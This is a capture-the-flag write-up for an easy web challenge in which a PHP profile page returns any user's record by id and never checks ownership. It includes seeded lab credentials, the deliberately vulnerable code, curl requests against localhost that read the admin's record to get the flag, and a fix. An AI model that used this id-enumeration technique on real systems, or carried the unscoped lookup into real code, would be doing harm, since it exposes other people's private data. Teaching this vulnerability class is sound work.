# w03 :: Chrome Idor — Writeup

**Category:** Web · **Difficulty:** easy · **Vuln:** Insecure Direct Object Reference (IDOR)

## Summary

`/profile.php` accepts a record identifier from the query string and looks it
up without ever confirming that the record belongs to the session that asked
for it. Authentication is enforced; authorization is not. Any logged-in user
can enumerate ids and read every other citizen's record — including the
admin's, which holds the flag.

No SQL injection is involved. The "database" is a static PHP array
(`app/lib.php`), so the only defect is the missing ownership check.

## Seeded accounts

| id   | username | password            | role  |
|------|----------|---------------------|-------|
| 1001 | `k4i`    | `chromes4life`      | user  |
| 1002 | `r3iko`  | `sunset_blade`      | user  |
| 9001 | `admin`  | `N3on_Gr1d_Adm1n!`  | admin |

`k4i` is the intended entry point and is disclosed in the login page hint.

## Vulnerable code

`app/profile.php`:

```php
$me = w0b_current();
if (!$me) { header('Location: /index.php'); exit; }

// VULNERABLE: only checks that *a* session exists, never that the requested
// record belongs to it.
$id = (int)($_GET['id'] ?? $_GET['user_id'] ?? $me['id']);
$target = w0b_user($id);
```

The record is fetched by whatever id the client supplies. The session identity
(`$me`) is used only to render the "viewing as" label — never to scope the
lookup.

## Exploitation

1. Log in as the low-privilege operator.

```bash
curl -s -c /tmp/jar.txt -b /tmp/jar.txt \
  -d 'username=k4i&password=chromes4life' \
  http://localhost:30003/index.php -i
```

2. You are redirected to `/profile.php?id=1001` — your own record. Change the
   id to the admin's record (`9001`):

```bash
curl -s -b /tmp/jar.txt 'http://localhost:30003/profile.php?id=9001'
```

The response contains the admin identity record and the flag in its `note`
field:

```
<div class="flag">hex4b0t{...}</div>
```

The `?user_id=` alias works identically:

```bash
curl -s -b /tmp/jar.txt 'http://localhost:30003/profile.php?user_id=9001'
```

Enumerating ids (`1001`, `1002`, `9001`, …) leaks the full population — the
hallmark of a direct object reference.

## Impact

Any authenticated user reads every other user's record, including
administrative secrets. In a real vault, ids are enumerable and the leak is
complete.

## Fix

Scope the lookup to the session, and require an explicit role check for
cross-record reads:

```php
$id = (int)($_GET['id'] ?? $me['id']);
if ($id !== (int)$me['id'] && $me['role'] !== 'admin') {
    http_response_code(403);
    exit('forbidden');
}
$target = w0b_user($id);
```

Better still, don't accept a raw object id at all: derive the record from the
session (`$me = w0b_user($_SESSION['uid'])`) and expose privileged records only
through a separate, role-gated route. Replacing sequential ids with
unguessable tokens removes the enumeration primitive entirely.
